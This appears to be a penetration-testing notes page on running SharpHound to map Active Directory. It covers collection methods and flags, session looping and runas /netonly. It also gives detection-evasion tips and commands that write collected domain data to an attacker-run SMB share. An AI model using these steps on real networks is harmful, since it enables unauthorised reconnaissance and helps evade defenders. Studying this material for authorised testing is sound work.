# Collection

The option `-collectionmethod` or `-c` allows us to specify what kind of data we want to\
collect. In the help menu above, we can see the list of collection methods. Let's describe\
some of them :

* `All` : Performs all collection methods except GPOLocalGroup .
* `DCOnly` : Collects data only from the domain controller and will not try to get data from domain-joined Windows devices. It will collect users, computers, security groups\
  memberships, domain trusts, abusable permissions on AD objects, OU structure, Group\
  Policy, and the most relevant AD object properties. It will attempt to correlate Group\
  Policy-enforced local groups to affected computers.
* `ComputerOnly` : This is the opposite of `DCOnly` . It will only collect information from\
  domain-joined computers, such as user sessions and local groups.

Depending on the scenario we are in, we will choose the method that best suits our needs.\
Let's see the following use case:

We are in an environment with 2000 computers, and they have a SOC with some network monitoring tools. We use the Default collection method but forget the computer from where we run SharpHound, which will try to connect to every computer in the domain.\
Our attack host started generating traffic to all workstations, and the SOC quarantined our\
machine.\
In this scenario, we should use DCOnly instead of All or Default , as it generates only traffic to the domain controller. We could pick the most interesting target machine and add them to a list (e.g: computers.txt ). Then, we would rerun SharpHound using the ComputerOnly collection method and the `--computerfile` option to try to enumerate only the computers in the computers.txt file. It is essential to know the methods and their implications.

### Common used flags

If we get credentials from a user other than the context from which we are running, we can\
use the `--ldapusername` and `--ldappassword` options to run SharpHound using those credentials.\
Another flag we find helpful is `-d` or `--domain` . Although this option is assigned by default, if we are in an environment where multiple domains exist, we can use this option to ensure that SharpHound will collect the information from the domain we specify. SharpHound will capture the domain controller automatically, but if we want to target a specific DC, we can use the option `--domaincontroller` followed by the IP or FQDN of the target domain controller. This option could help us target a forgotten or secondary domain, which may have less security or monitoring tools than the primary domain controller. Another use case for this flag is if we are doing port forward, we can specify an IP and port to target. We can use the flag `--ldapport` to select a port.

### Randomize and hide SharpHound output

It is known that SharpHound, by default, generates different .json files, then saves them in\
a zip file. It also generates a randomly named file with a .bin extension corresponding to\
the cache of the queries it performs. Defense teams could use these patterns to detect\
bloodhound. One way to try to hide these traces is by combining some of these options

| Option              | Description                                                   |
| ------------------- | ------------------------------------------------------------- |
| `--memcache`        | Keep cache in memory and don't write to disk.                 |
| `--randomfilenames` | Generate random filenames for output, including the zip file. |
| `--outputprefix`    | String to prepend to output file names.                       |
| `--outputdirectory` | Directory to output file too.                                 |
| `--zipfilename`     | Filename for the zip.                                         |
| `--zippassword`     | Password protects the zip with the specified password.        |

```shellscript
# Start a shared folder on a linux machine
sudo smbserver.py <SHARE_NAME> <DIR_TO_SHARE> -smb2support -user <USER> -password <PASS>

# Connec to the shared folder
net use \\<IP>\<SHARE> /user:<USER> <PASS>

# Run SharpHound and save the output to the shared folder
.\SharpHound.exe --memcache --outputdirectory \\<IP>\<SHARE>\ --zippassword <ZIP_PASS> --outputprefix <PREFIX> --randomfilenames

# If we set a password to the zip file, we will need to unzip it first, but if we didn't we
# could import the file as is, with the random name and extension and it will import it
unzip <ARCHIVE>
```

### Session loop collection method

When a user establishes a connection to a remote computer, it creates a session. The session information includes the username and the computer or IP from which the connection is coming. While active, the connection remains in the computer, but after the user disconnects, the session becomes idle and disappears in a few minutes. This means we have a small window of time to identify sessions and where users are active.<br>

Note: In Active Directory environments, it is important to understand where users are\
connected because it helps us understand which computers to compromise to achieve our\
goals.

When we run the SharpHound default collection method, it also includes the Session collection method. This method performs one round of session collection from the target computers. If it finds a session during that collection, it will collect it, but if the session expires, we won't have such information. That's why SharpHound includes the option `--loop`

| Option           | Description                                                                                          |
| ---------------- | ---------------------------------------------------------------------------------------------------- |
| `--loop`         | Loop computer collection.                                                                            |
| \`--             |                                                                                                      |
| loopduration\`   | Duration to perform looping (Default 02:00:00).                                                      |
| `--loopinterval` | Interval to sleep between loops (Default 00:00:30).                                                  |
| `--stealth`      | Perform "stealth" data collection. Only touch systems are the most likely to have user session data. |

```shellscript
#  Search sessions for the following hour and query each computer every minute
.\SharpHound.exe -c Session --loop --loopduration 01:00:00 --loopinterval 00:01:00
```

### Running from non-domain joined systems

Useful if we perform an engagement from a windows box which is not domain joined

In these scenarios, we can use `runas /netonly /user:<USER> <APP>` to execute the application with specific user credentials. The `/netonly` flag ensures network access using the provided credentials.

Before using SharpHound, we need to be able to resolve the DNS names of the target domain, and if we have network access to the domain's DNS server, we can configure our network card DNS settings to that server. If this is not the case, we can set up our [hosts file](https://en.wikiversity.org/wiki/Hosts_file/Edit) and include the DNS names of the domain controller.

Configure the DNS server to the Domain Controller Internal IP

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F2YyzOinPWzR6GJOmBWf6%2Fimage.png?alt=media&#x26;token=75caafb0-b351-480c-aaf6-27b821435cec" alt=""><figcaption></figcaption></figure>

Run `cmd.exe` as the domain user. `runas /netonly` does not validate credentials, and if we use the wrong credentials, we will notice it while trying to connect through the network.

```shellscript
# Open a cmd shell as the domain user
runas /netonly /user:<DOMAIN>\<USER> cmd.exe

# Confirm we have sucessfully authenticated
net view \\<DOMAIN>\

# We can now run SharpHound by giving the --domain option
.\SharpHound.exe -d <DOMAIN>
```
